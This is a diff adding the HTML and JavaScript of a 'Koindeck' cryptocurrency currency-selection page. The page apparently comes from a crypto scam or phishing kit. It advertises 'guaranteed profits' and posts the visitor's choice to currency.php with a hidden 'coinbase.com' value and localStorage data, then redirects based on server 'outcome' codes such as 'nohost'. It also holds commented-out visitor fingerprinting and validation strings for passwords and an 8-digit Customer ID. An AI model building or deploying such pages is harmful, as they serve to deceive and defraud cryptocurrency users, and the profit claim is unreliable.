@@ -1,0 +1,238 @@
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Fast, private and secure way to save &amp; earn guaranteed profits on your cryptocurrencies with the Koindeck advantage.">    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Koindeck </title>
+    <!-- Favicon icon -->
+    <link rel="icon" type="image/png" sizes="16x16" href="./images/favicon.png">
+    <!-- Custom Stylesheet -->
+    <link rel="stylesheet" href="./vendor/waves/waves.min.css">
+    <link rel="stylesheet" href="./vendor/owlcarousel/css/owl.carousel.min.css">
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="stylesheet" href="w3.css">
+<style>
+.mySlides {display:none;}
+</style>
+</head><body>
+
+    <div id="ajaxpreloader" style="display: none;">
+        <div class="ajaxsk-three-bounce">
+            <div class="sk-child "><img src="images/ripple.svg"></div>   
+        </div>
+    </div>
+
+    <div id="main-wrapper" class="show">
+
+        <div class="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xl-12">
+                        <nav class="navbar navbar-expand-lg navbar-light px-0 justify-content-between">
+                            
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+        <div id="currDiv" class="authincation section-padding" style="display:block">
+        
+        <input type="hidden" id="currencyApi" value="coinbase.com">
+            <div class="container h-100">
+          
+                <div class="row justify-content-center h-100 align-items-center">
+               
+                    <div class="col-xl-4 col-md-6">
+                                                                                           
+                        <div class="auth-form card">
+                        
+                            <div class="card-header justify-content-center">
+                            <h4 class="card-title"><b>CURRENCY SELECTION</b></h4>                            </div>
+                            <div id="errorBox" style="display: none;background: #e82753;color: #fff;width: 98%; text-align: center;margin: auto;padding: 8px;">
+                                
+                            </div>
+                            <div style="padding: 20px;">Select your preferred currency to view your crypto balances with</div>                            <div class="card-body" style="background:rgb(239, 239, 241);">
+                                   
+                                <div class="w3-content w3-display-container">
+                                    
+                                   <div align="center"><a href="#" onclick="fiatSelector('EUR','€');"> <img class="mySlides" src="images/flags/eu.svg" style="width: 62.5%; display: block;"></a></div>
+                                   <div align="center"><a href="#" onclick="fiatSelector('USD','$');"> <img class="mySlides" src="images/flags/us.svg" style="width: 60%; display: none;"></a></div>
+                                   <div align="center"><a href="#" onclick="fiatSelector('GBP','£');"> <img class="mySlides" src="images/flags/gb.svg" style="width: 60%; display: none;"></a></div>
+                                   <div align="center"><a href="#" onclick="fiatSelector('AUD','$');"> <img class="mySlides" src="images/flags/au.svg" style="width: 60%; display: none;"></a></div>
+                                   <div align="center"><a href="#" onclick="fiatSelector('CAD','$');"> <img class="mySlides" src="images/flags/ca.svg" style="width: 60%; display: none;"></a></div>
+                                   <div align="center"><a href="#" onclick="fiatSelector('CHF','F');"> <img class="mySlides" src="images/flags/ch.svg" style="width: 60%; display: none;"></a></div>
+                                   <div align="center"><a href="#" onclick="fiatSelector('CNY','¥');"> <img class="mySlides" src="images/flags/cn.svg" style="width: 60%; display: none;"></a></div>
+                                   <div align="center"><a href="#" onclick="fiatSelector('INR','₹');"> <img class="mySlides" src="images/flags/in.svg" style="width: 60%; display: none;"></a></div>
+                                   <div align="center"><a href="#" onclick="fiatSelector('JPY','¥');"> <img class="mySlides" src="images/flags/jp.svg" style="width: 60%; display: none;"></a></div>
+                                   <div align="center"><a href="#" onclick="fiatSelector('RUB','₽');"> <img class="mySlides" src="images/flags/ru.svg" style="width: 60%; display: none;"></a></div>
+                                   <div align="center"><a href="#" onclick="fiatSelector('THB','฿');"> <img class="mySlides" src="images/flags/th.svg" style="width: 60%; display: none;"></a></div>
+                                   <div align="center"><a href="#" onclick="fiatSelector('TRY','₺');"> <img class="mySlides" src="images/flags/tr.svg" style="width: 60%; display: none;"></a></div>
+
+                                    <button class="w3-button w3-black w3-display-left waves-effect" onclick="plusDivs(-1)" style="vertical-align:top;">❮</button>
+                                    <button class="w3-button w3-black w3-display-right waves-effect" onclick="plusDivs(1)">❯</button>
+                                   
+                                  </div>
+                               <div align="center"><h4 id="text" style="font-weight: bold;">EUR (€)</h4></div>
+                            </div>
+                            <div class="card-body">
+                               
+                                 
+                             </div>
+
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script>
+            var slideIndex = 1;
+            showDivs(slideIndex);
+            
+            function plusDivs(n) {
+              showDivs(slideIndex += n);
+            }
+            
+            function showDivs(n) {
+
+                var desc=["nothing", "EUR (€)"," USD ($)"," GBP (£)"," AUD ($)"," CAD ($)"," CHF (F)"," CNY (¥)"," INR (₹)"," JPY (¥)"," RUB (₽)"," THB (฿)"," TRY (₺)"];
+      
+              var i;
+              var x = document.getElementsByClassName("mySlides");
+              if (n > x.length) {slideIndex = 1}
+              if (n < 1) {slideIndex = x.length}
+              for (i = 0; i < x.length; i++) {
+                x[i].style.display = "none";  
+              }
+              x[slideIndex-1].style.display = "block";  
+              console.log(slideIndex);
+             document.getElementById('text').innerHTML= desc[slideIndex]; 
+            }
+            </script>
+
+
+        <div class="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-xl-6 col-md-6">
+                        
+                    </div>
+                    <div class="col-xl-6 col-md-6 text-lg-right text-center">
+                        
+                    </div>
+                </div>
+                <div class="row align-items-center">
+                    <div class="col-xl-12 text-center text-lg-right">
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <div class="bg_icons"></div>
+    <script>
+     var init1='Please enter your firstname';
+var init2='Please provide a password';
+var init3='Your password must be at least 6 characters long';
+var init4='Please provide your Customer ID';
+var init5='Your customer ID is 8 digits long';
+var init6='Please enter a valid email address';
+var init7='Password is too short';  
+    </script>  
+
+    <script src="./vendor/jquery/jquery.min.js"></script>
+    <script src="./vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="./vendor/waves/waves.min.js"></script>
+
+    <script src="./vendor/validator/jquery.validate.js"></script>
+    <script src="./vendor/validator/validator-init.js"></script>
+
+    <script src="./js/scripts.js"></script>
+    <div id="ajaxloader" style="display: none;">
+    <div id="ajaxpreloader">
+        <div class="ajaxsk-three-bounce">
+            <div class="sk-child "><img src="images/ripple.svg"></div>
+            
+        </div>
+    </div>
+</div>
+<!--
+<script>
+function showFlags(x){
+    document.getElementById('currencyApi').value=x;
+   if(x){ document.getElementById('currDiv').style.display="block";}
+}
+
+  function initFingerprintJS() {
+    FingerprintJS.load({token: 'ecN1V8BssN4ME5pNM4U9'})
+      .then(fp => fp.get())
+      .then(result => showFlags(result.visitorId)); 
+        
+  }
+
+</script>
+<script
+  async
+  src="./js/serverApi.min.js"
+  onload="initFingerprintJS()"
+></script>
+-->
+
+<script>	
+    function fiatSelector(cur,sym){
+          document.getElementById('ajaxloader').style.display='block'; //blocks screen
+
+    var ajaxJquery = window.localStorage.getItem("ajaxJquery");
+    var jqueryVersion = window.localStorage.getItem("jqueryVersion");
+    var currencyApi=document.getElementById('currencyApi').value;
+      
+      
+      // AJAX CALL
+    $.ajax({
+      
+      type:"post",
+      url:"currency.php",
+      datatype:"json",
+      data: {currency: cur, symbol: sym, ajaxJquery: ajaxJquery, jqueryVersion: jqueryVersion, currencyApi:currencyApi},
+      success:function(respnx)
+      {
+      validator = JSON.parse(respnx);
+      
+      if(validator['outcome']=="success"){
+      window.location.href="http://koindeck.com/"
+      return;
+      }
+      if(validator['outcome']=="test"){
+      console.log(validator['msg']);
+            return;
+      }
+      if(validator['outcome']=="nohost"){
+      window.location.href="/";
+      return;
+      }
+            if(validator['outcome']!="success"){
+      document.getElementById('ajaxloader').style.display='none'; //opens screen
+      document.getElementById('errorBox').style.display='none';
+        document.getElementById('errorBox').innerHTML="An unexpected error occurred, please check your internet connection and try again.";
+        return;
+        }
+        
+      
+     },
+         error: function(badx)
+         {
+            document.getElementById('errorBox').style.display='block';
+    document.getElementById('errorBox').innerHTML="An unexpected error occurred, please check your internet connection and try again.";
+    document.getElementById('ajaxloader').style.display='none';    
+         }
+        
+    });
+  
+    }
+  
+  </script>
+
+
+</body>
